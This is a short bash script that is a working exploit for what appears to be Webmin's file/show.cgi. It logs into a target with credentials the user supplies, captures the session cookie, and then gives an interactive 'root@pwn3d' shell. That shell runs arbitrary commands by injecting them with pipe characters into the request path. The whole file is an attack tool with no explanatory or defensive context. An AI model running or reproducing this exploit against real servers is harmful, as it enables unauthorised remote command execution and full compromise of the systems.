#!/bin/bash

##Variables##
read -p "url: " url
login_path="/session_login.cgi"
vulnerable_path="/file/show.cgi/bin/"

##Logic##

#Getting the Host
if [ $(echo $url | grep -Eo --colour 'http[s]?://' -c) == "1" ]; then
	url=$(echo $url | cut -d "/" -f3)
fi


# Checking if the host is UP
echo "Checking if host is UP..."

if [ $(ping -c 1 -W 3 "$url" 2>/dev/null &>/dev/null ; echo $?) == "0" ]; then
	sleep 3
	echo "$url is UP"
else
	echo "$url is not up. Quitting..."
	exit 1
fi


#Log in
read -p "User: " user
read -p "Password: " password

while [[ $(curl -sk -X POST -d"page=%2F&user=$user&pass=$password" $url$login_path -b "cookies=testing=1" --cookie-jar cookies.txt | grep -c "Login failed") == "1" ]]; do
	echo "Incorrect credentials"
	read -p "User: " user
	read -p "Password: " password
done

#Getting the cookie
cookie=$(cat cookies.txt | grep sid | awk '{print $NF}')

#Executing commands
random=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)

while [ "$command" != "exit" ]; do
	read -p "root@pwn3d: " command
	curl -b "testing=1; sid=$cookie" -sk "http://$url$vulnerable_path$random|$command|" --ignore-content-length
done

echo "~~ Bye ~~"
